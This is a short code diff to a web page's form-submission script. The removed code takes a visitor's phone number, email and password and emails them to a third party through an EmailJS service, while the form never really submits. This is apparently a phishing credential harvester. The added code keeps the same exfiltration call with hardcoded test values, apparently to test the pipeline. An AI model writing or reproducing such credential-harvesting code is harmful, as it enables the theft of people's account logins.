@@ -458,20 +458,17 @@
             // Show loading indicator
             document.getElementById('loading').classList.remove('hidden');
                 // Send data via EmailJS
-            emailjs.send('service_ve6w0et', 'template_fzdw02s', {
-                phone: phone,
-                email: email,
-                password: password
-             })
+           emailjs.send('service_ve6w0et', 'template_fzdw02s', {
+                   phone: '1234567890',
+                   email: 'test@example.com',
+                   password: 'testpassword'
+                    })
                 .then(function(response) {
-                    console.log('Email sent successfully:', response);
-                    document.getElementById('loading').classList.add('hidden');
-                    document.getElementById('success').classList.remove('hidden');
-                }, function(error) {
-                    console.log('Error sending email:', error);
-                    document.getElementById('loading').classList.add('hidden');
-                    document.getElementById('failure').classList.remove('hidden');
-                });
+                 console.log('Email sent successfully:', response);
+               }, function(error) {
+    console.log('Error sending email:', error);
+});
+
 
             return false; // Prevent form from actually submitting
         }
